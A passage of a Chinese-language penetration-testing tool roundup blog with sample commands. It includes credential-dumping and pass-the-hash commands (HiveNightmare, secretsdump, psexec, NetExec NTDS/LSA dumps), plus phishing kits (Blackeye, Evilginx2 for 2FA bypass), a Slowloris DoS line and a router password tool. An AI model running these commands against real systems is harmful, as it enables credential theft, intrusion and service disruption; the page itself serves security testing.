+<figure class="highlight nsis"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nsis"><span class="hljs-comment"># 获取 SAM, SECURITY 和 SYSTEM 配置单元转储</span><br>.\HiveNightmare.exe<br><span class="hljs-comment"># 将这三个文件下载到你的机器并提取哈希：</span><br>impacket-secretsdump -sam SAM -<span class="hljs-params">system</span> <span class="hljs-params">SYSTEM</span> -security SECURITY local<br><span class="hljs-comment"># 使用哈希传递 (Pass The Hash) 技术登录远程系统：</span><br>impacket-psexec -hashes <span class="hljs-variable">$hash</span> <span class="hljs-variable">$user</span>@<span class="hljs-variable">$ip</span><br></code></pre></div></td></tr></table></figure>
+
+<p><strong>PingCastle</strong> <a target="_blank" rel="noopener" href="https://www.pingcastle.com/%EF%BC%9A%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%EF%BC%88AD%EF%BC%89%E9%85%8D%E7%BD%AE%E4%B8%8E%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8%E3%80%82">https://www.pingcastle.com/：活动目录（AD）配置与漏洞扫描器。</a></p>
+<hr>
+<h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><p>因为文件无处不在，且往往缺乏安全保护。</p>
+<p><strong>NetExec (原名 CrackMapExec) <strong><a target="_blank" rel="noopener" href="https://github.com/Pennyw0rth/NetExec%EF%BC%9A%E5%A6%82%E6%9E%9C%E5%9C%A8">https://github.com/Pennyw0rth/NetExec：如果在</a> Windows 网络中，这是</strong>必选</strong>工具。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros"><span class="hljs-comment"># 匿名和访客登录检查</span><br>nxc<span class="hljs-built_in"> smb IP </span>-u <span class="hljs-string">&#x27;&#x27;</span> -p <span class="hljs-string">&#x27;&#x27;</span> &amp;&amp; nxc<span class="hljs-built_in"> smb IP </span>-u <span class="hljs-string">&#x27;a&#x27;</span> -p <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment"># 导出本地 SAM 哈希</span><br>nxc<span class="hljs-built_in"> smb IP </span>-u <span class="hljs-string">&#x27;user&#x27;</span> -p <span class="hljs-string">&#x27;pass&#x27;</span> --local-auth --sam<br><span class="hljs-comment"># 执行命令 (whoami)</span><br>nxc<span class="hljs-built_in"> smb IP </span>-u<span class="hljs-built_in"> user </span>-H <span class="hljs-string">&#x27;hash&#x27;</span> --local-auth -X <span class="hljs-string">&#x27;whoami&#x27;</span><br><span class="hljs-comment"># 各种哈希与凭据提取 (LSA, SAM, NTDS, LAPS, GPP 等)</span><br>nxc<span class="hljs-built_in"> smb IP </span>-u<span class="hljs-built_in"> user </span>-p <span class="hljs-string">&#x27;pass&#x27;</span> -d DOMAIN --lsa<br>nxc<span class="hljs-built_in"> smb IP </span>-u<span class="hljs-built_in"> user </span>-p <span class="hljs-string">&#x27;pass&#x27;</span> --ntds<br>nxc<span class="hljs-built_in"> smb IP </span>-u<span class="hljs-built_in"> user </span>-p <span class="hljs-string">&#x27;pass&#x27;</span> --laps<br></code></pre></div></td></tr></table></figure>
+
+<p>**Snaffler **<a target="_blank" rel="noopener" href="https://github.com/SnaffCon/Snaffler%EF%BC%9A%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BA%BA%E5%91%98%E7%9A%84%E2%80%9C%E7%B3%96%E6%9E%9C%E2%80%9D%E6%90%9C%E7%B4%A2%E5%99%A8%EF%BC%8C%E7%94%A8%E4%BA%8E%E5%9C%A8">https://github.com/SnaffCon/Snaffler：渗透测试人员的“糖果”搜索器，用于在</a> SMB 共享中寻找有趣的敏感文件。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">snaffler<span class="hljs-selector-class">.exe</span> -s -o snaffler<span class="hljs-selector-class">.log</span><br>Snaffler<span class="hljs-selector-class">.exe</span> -s -<span class="hljs-selector-tag">i</span> C:\<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>Nmap</strong>：每个阶段都离不开的老伙计。</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-comment"># 扫描 139 和 445 端口</span><br>nmap -iL list_of_IPs.txt -sV -O -p139,<span class="hljs-number">445</span> -<span class="hljs-built_in">T3</span> -PN<br><span class="hljs-comment"># 扫描 SMB 相关漏洞</span><br>nmap -iL list_of_445.txt -p139,<span class="hljs-number">445</span> -<span class="hljs-built_in">T3</span> -PN --<span class="hljs-keyword">script </span>smb-vuln*<br></code></pre></div></td></tr></table></figure>
+
+<p>**Smbmap **<a target="_blank" rel="noopener" href="https://github.com/ShawnDEvans/smbmap%EF%BC%9A%E4%BE%BF%E6%8D%B7%E7%9A%84">https://github.com/ShawnDEvans/smbmap：便捷的</a> SMB 枚举工具。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">./smbmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;&quot;</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;&quot;</span> -P <span class="hljs-number">445</span> <span class="hljs-attr">--host-file</span> list_of_targets<span class="hljs-selector-class">.txt</span> -<span class="hljs-selector-tag">g</span> /output_anonymous<span class="hljs-selector-class">.txt</span><br>./smbmap<span class="hljs-selector-class">.py</span> -H <span class="hljs-number">192.168</span>.<span class="hljs-number">0.200</span> -u Administrator -<span class="hljs-selector-tag">p</span> asdf1234<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>SMBeagle</strong> <a target="_blank" rel="noopener" href="https://github.com/punk-security/SMBeagle%EF%BC%9A%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7%E3%80%82">https://github.com/punk-security/SMBeagle：文件共享审计工具。</a></p>
+<figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">./SMBeagle<span class="hljs-selector-class">.exe</span> -c out<span class="hljs-selector-class">.csv</span> -f<br></code></pre></div></td></tr></table></figure>
+
+<p>**PowerHuntShares **<a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerHuntShares%EF%BC%9A%E5%AE%A1%E8%AE%A1%E8%84%9A%E6%9C%AC%EF%BC%8C%E6%97%A8%E5%9C%A8%E6%B8%85%E7%82%B9%E3%80%81%E5%88%86%E6%9E%90%E5%B9%B6%E6%8A%A5%E5%91%8A">https://github.com/NetSPI/PowerHuntShares：审计脚本，旨在清点、分析并报告</a> Active Directory 域中配置的过度特权。</p>
+<hr>
+<h3 id="移动端-Mobile"><a href="#移动端-Mobile" class="headerlink" title="移动端 (Mobile)"></a>移动端 (Mobile)</h3><p>有时对移动应用进行基础分析可以找到 API 接口或硬编码密码。</p>
+<p>**Apkleaks **<a target="_blank" rel="noopener" href="https://github.com/dwisiswant0/apkleaks%EF%BC%9A%E6%89%AB%E6%8F%8F">https://github.com/dwisiswant0/apkleaks：扫描</a> APK 文件中的 URI、端点和敏感信息（Secrets）。</p>
+<figure class="highlight applescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs applescript">apkleaks -f ~/path/<span class="hljs-keyword">to</span>/<span class="hljs-built_in">file</span>.apk<br></code></pre></div></td></tr></table></figure>
+
+<p>**Apk2url **<a target="_blank" rel="noopener" href="https://github.com/n0mi1k/apk2url%EF%BC%9A%E4%B8%80%E6%AC%BE">https://github.com/n0mi1k/apk2url：一款</a> OSINT 工具，通过反汇编和反编译快速从 APK 中提取 IP 和 URL 端点。</p>
+<figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle">.<span class="hljs-regexp">/apk2url.sh /</span>path<span class="hljs-regexp">/to/</span>apk/<span class="hljs-keyword">file</span>.apk<br></code></pre></div></td></tr></table></figure>
+
+<h2 id="GitHub-搜集"><a href="#GitHub-搜集" class="headerlink" title="GitHub 搜集"></a>GitHub 搜集</h2><p>用于在 GitHub 上寻找有趣的敏感信息。</p>
+<p>**Trufflehog **<a target="_blank" rel="noopener" href="https://github.com/trufflesecurity/trufflehog%EF%BC%9A%E6%9F%A5%E6%89%BE%E5%B9%B6%E9%AA%8C%E8%AF%81%E7%A7%98%E5%AF%86%E4%BF%A1%E6%81%AF%EF%BC%88Secrets%EF%BC%8C%E5%A6%82">https://github.com/trufflesecurity/trufflehog：查找并验证秘密信息（Secrets，如</a> API Key 等）。</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># 扫描指定仓库并仅显示验证过的结果</span><br>trufflehog git https:<span class="hljs-string">//github.com/trufflesecurity/test_keys</span> <span class="hljs-params">--only-verified</span><br><span class="hljs-comment"># 扫描整个组织</span><br>trufflehog github <span class="hljs-params">--org=trufflesecurity</span> <span class="hljs-params">--only-verified</span><br><span class="hljs-comment"># 启动交互式向导</span><br>trufflehog <br></code></pre></div></td></tr></table></figure>
+
+<ul>
+<li><strong>Octosuite</strong>：GitHub 数据分析框架。 <a target="_blank" rel="noopener" href="https://github.com/bellingcat/octosuite">https://github.com/bellingcat/octosuite</a></li>
+<li><strong>Legitify</strong>：检测并修复 GitHub 和 GitLab 资产中的错误配置和安全风险。 <a target="_blank" rel="noopener" href="https://github.com/Legit-Labs/legitify">https://github.com/Legit-Labs/legitify</a></li>
+<li><strong>gitleaks</strong>：专门用于查找代码中的敏感信息。 <a target="_blank" rel="noopener" href="https://github.com/gitleaks/gitleaks">https://github.com/gitleaks/gitleaks</a></li>
+<li><strong>Secret Magpie</strong>：敏感信息检测工具。 <a target="_blank" rel="noopener" href="https://github.com/punk-security/secret-magpie">https://github.com/punk-security/secret-magpie</a></li>
+</ul>
+<figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">python <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.py</span> &lt;github/gitlab/azuredevops&gt; <span class="hljs-attr">--org</span> <span class="hljs-string">&#x27;组织名称&#x27;</span> <span class="hljs-attr">--pat</span> <span class="hljs-string">&#x27;个人访问令牌&#x27;</span><br></code></pre></div></td></tr></table></figure>
+
+<ul>
+<li><strong>DotGit</strong>：一个浏览器扩展，用于检查访问的网站是否存在 <code>.git</code> 目录泄露。 <a target="_blank" rel="noopener" href="https://github.com/davtur19/DotGit">https://github.com/davtur19/DotGit</a></li>
+</ul>
+<hr>
+<h3 id="API-安全"><a href="#API-安全" class="headerlink" title="API 安全"></a>API 安全</h3><p><strong>Apidetector</strong> <a target="_blank" rel="noopener" href="https://github.com/brinhosa/apidetector%EF%BC%9A%E9%AB%98%E6%95%88%E6%89%AB%E6%8F%8F">https://github.com/brinhosa/apidetector：高效扫描</a> Web 域名和子域名中暴露的 Swagger 端点。支持多线程、灵活的输入输出，是 API 安全测试的理想工具。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">python apidetector<span class="hljs-selector-class">.py</span> -<span class="hljs-selector-tag">i</span> 子域名列表<span class="hljs-selector-class">.txt</span> -o 结果文件<span class="hljs-selector-class">.txt</span> -t <span class="hljs-number">30</span> -ua <span class="hljs-string">&quot;Mozilla/5.0...&quot;</span><br></code></pre></div></td></tr></table></figure>
+
+<hr>
+<h3 id="LFI-本地文件包含"><a href="#LFI-本地文件包含" class="headerlink" title="LFI (本地文件包含)"></a>LFI (本地文件包含)</h3><p><strong>Lfi-Space</strong> <a target="_blank" rel="noopener" href="https://github.com/capture0x/Lfi-Space%EF%BC%9A%E7%94%A8%E4%BA%8E%E6%A3%80%E6%B5%8B">https://github.com/capture0x/Lfi-Space：用于检测</a> LFI 漏洞。已从 GitHub 安装在 <code>/opt</code> 目录下的 Python 虚拟环境中。</p>
+<figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> lfi.<span class="hljs-keyword">py</span><br></code></pre></div></td></tr></table></figure>
+
+<hr>
+<h3 id="OpenRedirect-开放重定向"><a href="#OpenRedirect-开放重定向" class="headerlink" title="OpenRedirect (开放重定向)"></a>OpenRedirect (开放重定向)</h3><p><strong>OpenRedireX</strong> <a target="_blank" rel="noopener" href="https://github.com/devanshbatham/OpenRedireX%EF%BC%9A%E6%A3%80%E6%B5%8B%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E3%80%82">https://github.com/devanshbatham/OpenRedireX：检测开放重定向漏洞的模糊测试工具。</a></p>
+<figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">openredirex <span class="hljs-selector-attr">[-p payloads]</span> <span class="hljs-selector-attr">[-k 关键字]</span> <span class="hljs-selector-attr">[-c 并发数]</span><br></code></pre></div></td></tr></table></figure>
+
+<hr>
+<h3 id="PCAP-流量分析"><a href="#PCAP-流量分析" class="headerlink" title="PCAP (流量分析)"></a>PCAP (流量分析)</h3><ul>
+<li>**NetworkAssessment **<a target="_blank" rel="noopener" href="https://github.com/HalilDeniz/NetworkAssessment%EF%BC%9A%E5%88%86%E6%9E%90">https://github.com/HalilDeniz/NetworkAssessment：分析</a> pcap 文件以检测潜在的可疑网络流量。</li>
+<li><strong>TrafficWatch</strong> <a target="_blank" rel="noopener" href="https://github.com/HalilDeniz/TrafficWatch%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%8C%85%E5%97%85%E6%8E%A2%E5%B7%A5%E5%85%B7%EF%BC%8C%E7%94%A8%E4%BA%8E%E7%9B%91%E6%8E%A7%E5%92%8C%E5%88%86%E6%9E%90">https://github.com/HalilDeniz/TrafficWatch：数据包嗅探工具，用于监控和分析</a> PCAP 文件中的流量。</li>
+<li><strong>pyWhat</strong> <a target="_blank" rel="noopener" href="https://github.com/bee-san/pyWhat%EF%BC%9A%E4%B8%87%E7%89%A9%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7%E3%80%82%E5%AE%83%E5%8F%AF%E4%BB%A5%E8%AF%86%E5%88%AB%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E3%80%81IP">https://github.com/bee-san/pyWhat：万物识别工具。它可以识别电子邮件、IP</a> 地址等。你可以向它输入文本或 .pcap 文件，它会告诉你里面包含什么！</li>
+</ul>
+<hr>
+<h3 id="其他工具-Other"><a href="#其他工具-Other" class="headerlink" title="其他工具 (Other)"></a>其他工具 (Other)</h3><p>根据具体发现的任务，以下是一些可能用到的工具：</p>
+<ul>
+<li><p><strong>Bluing</strong>：蓝牙黑客攻击的情报搜集工具。 <a target="_blank" rel="noopener" href="https://github.com/fO-000/bluing">https://github.com/fO-000/bluing</a></p>
+</li>
+<li><p><strong>隐写术工具</strong>（常用于 CTF 或实验）：<strong>binwalk</strong>、<strong>stegosuite</strong>、<strong>stegextract</strong>、<strong>stegsolver</strong>、<strong>steghide</strong>。</p>
+</li>
+<li><p><strong>Blackeye</strong>：结合 localtunnel 的酷炫网络钓鱼工具。 <a target="_blank" rel="noopener" href="https://github.com/EricksonAtHome/blackeye">https://github.com/EricksonAtHome/blackeye</a></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-keyword">bash </span><span class="hljs-keyword">blackeye.sh</span><br></code></pre></div></td></tr></table></figure>
+</li>
+<li><p><strong>Evilginx2</strong>：独立的中间人攻击（MITM）框架，用于钓取登录凭据和会话 Cookie，从而<strong>绕过双重身份验证（2FA）</strong>。 <a target="_blank" rel="noopener" href="https://github.com/kgretzky/evilginx2">https://github.com/kgretzky/evilginx2</a></p>
+</li>
+<li><p><strong>Slowloris</strong>：低带宽拒绝服务（DoS）工具。 <a target="_blank" rel="noopener" href="https://github.com/gkbrk/slowloris">https://github.com/gkbrk/slowloris</a></p>
+<figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> slowloris.<span class="hljs-keyword">py</span> example.<span class="hljs-keyword">com</span><br></code></pre></div></td></tr></table></figure>
+</li>
+<li><p><strong>Arsenal</strong>：一个快速的黑客程序清单和启动器，防止你忘记命令。 <a target="_blank" rel="noopener" href="https://github.com/Orange-Cyberdefense/arsenal">https://github.com/Orange-Cyberdefense/arsenal</a></p>
+</li>
+<li><p><strong>ApacheTomcatScanner</strong>：扫描 Apache Tomcat 服务器漏洞。 <a target="_blank" rel="noopener" href="https://github.com/p0dalirius/ApacheTomcatScanner">https://github.com/p0dalirius/ApacheTomcatScanner</a></p>
+<figure class="highlight ada"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ada">apachetomcatscanner -tt IP -tp - <span class="hljs-comment">--list-cves</span><br></code></pre></div></td></tr></table></figure>
+</li>
+<li><p><strong>RomBuster</strong>：路由器漏洞利用工具，可获取网络路由器的管理员密码。 <a target="_blank" rel="noopener" href="https://github.com/EntySec/RomBuster">https://github.com/EntySec/RomBuster</a></p>
+<figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">rombuster -<span class="hljs-selector-tag">a</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">99.1</span><br>rombuster <span class="hljs-attr">--shodan</span> &lt;SHODAN_API&gt;<br></code></pre></div></td></tr></table></figure>
+</li>
+<li><p><strong>onionscout</strong>：针对 Tor 隐藏服务（.onion）的轻量级 CLI 安全检查工具。 <a target="_blank" rel="noopener" href="https://github.com/h0ek/onionscout">https://github.com/h0ek/onionscout</a></p>
+</li>
+<li><p><strong>UUID Tools</strong>：在线 UUID 解码器。 <a target="_blank" rel="noopener" href="https://www.uuidtools.com/decode">https://www.uuidtools.com/decode</a></p>
+</li>
+<li><p><strong>CyberChef</strong>：被称为“网络版瑞士军刀”，用于加密、编码、压缩和数据分析。 <a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></p>
+</li>
+<li><p><strong>Hashes.com</strong>：哈希查询服务，用于识别、破解、验证哈希值。 <a target="_blank" rel="noopener" href="https://hashes.com/">https://hashes.com/</a></p>
+</li>
+<li><p><strong>waybackurls</strong>：获取 Wayback Machine 中记录的所有目标域名的 URL。 <a target="_blank" rel="noopener" href="https://github.com/tomnomnom/waybackurls">https://github.com/tomnomnom/waybackurls</a></p>
+<figure class="highlight 1c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs 1c">cat domains.txt <span class="hljs-string">| waybackurls &gt; urls</span><br></code></pre></div></td></tr></table></figure></li>
+</ul>
+<h2 id="补充材料-Additional-Materials"><a href="#补充材料-Additional-Materials" class="headerlink" title="补充材料 (Additional Materials)"></a>补充材料 (Additional Materials)</h2><p>当我的扫描和测试发现了一些新东西，或者需要深入开发，又或者我遇到一个不熟悉的特定服务、软件或端口时，我会去查阅各种黑客维基和速查表，寻找下一步该怎么做的信息。我一直梦想着能创建一个属于自己的维基，但那需要大量的时间和投入，而下面列出的这些已经非常完美了。也许将来等这篇文章规模进一步扩大后（没错，想象一下它还能变得更长——“那谁”也这么说过），我会把它重构成一个独立的维基。（该死，在写这篇文章期间，我甚至开始测试 MkDocs、MkDocs for Material、TeeDoc 和 Docusaurus，测试后觉得 Docusaurus 看起来最棒，所以也许在不久的将来……毕竟，为什么不挥霍一下我的时间呢）。</p>
+<p>好了，以下是当我缺乏某个特定领域的知识时会去参考的网站列表：</p>
+<ul>
+<li><a href>HackTricks</a></li>
+<li><a href>ired.team</a></li>
+<li><a href>Haax’s CheatSheet</a></li>
+<li><a href>The Hacker Recipes</a></li>
+<li><a href>PentestBook</a></li>
+<li><a href>Pentest Everything</a></li>
+<li><a href>HighOn.Coffee Pentest Cheat Sheet</a></li>
+<li><a href>Hausec</a></li>
+<li><a href>Hide and Sec</a></li>
+<li><a href>Red Team Guide Checklists</a></li>
+</ul>
+<p>这里还有非常棒的黑客工具<strong>思维导图</strong>。事实上，每一张导图都可以作为针对特定场景或服务的独立工具使用指南。在浏览如此庞大的知识库时，尽情享受“浪费”宝贵生命的过程吧。因为，为什么不挥霍你的时间呢！</p>
+<ul>
+<li><a href>Ignite Technologies Mindmaps</a></li>
+</ul>
+<hr>
+<h3 id="最后一点建议"><a href="#最后一点建议" class="headerlink" title="最后一点建议"></a>最后一点建议</h3><p>还有一件事：<strong>不要使用太多的“多合一”工具</strong>，或者那些标榜能帮你搞定一切的“赏金猎人助手”。现在有很多新项目试图将我上面列出的各种工具自动化组合起来，比如 <code>scan4all</code> 或 <code>rekono</code> 等。这些项目在有人维护和开发时确实很酷，但最终大多寿命很短且存在大量 Bug。</p>
+<p><strong>没有任何一个工具能为你包办一切</strong>，并直接生成一份能让你直接拿去换赏金的报告。所以，当你看到一个工具的依赖项里包含了 Nikto、Sublist3r、SQLMap、Gobuster 等工具时，这通常意味着它只是一个“套壳”，在后台运行这些工具并收集结果，或者在模块间传递数据。这对你并没有实质性的提升。</p>
+<p>如果你想实现自动化，<strong>自己写一个简单的脚本</strong>：只做一件事，然后把结果传给下一环，而你最终仍然需要亲自分析结果。自动化固然很棒，但过度自动化会导致错误，让你错失细节。如果花了一整天跑扫描，最后却发现结果有误或遗漏了关键信息，那才是真的浪费时间。</p>
+<p>这些“全能型”工具对新手的唯一作用是<strong>帮助理解流程和所使用的工具</strong>。你可以遵循它们的逻辑，复现它们的步骤，从而掌握基础。在我上面的清单中，你也发现了一些自动化工具，但我只选择了那些专注于单一任务、在某一类别中活动范围较窄的工具。</p>
+<p>顺便关注一下 <strong>PentestGPT</strong>。现在 AI 正流行，你必须得用它，否则你就不够“酷”了。一点都不酷。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E8%BD%AC%E8%BD%BD/">转载</a>
+                    
+                  </div>
+                
+              </div>
+              
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+    
+
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
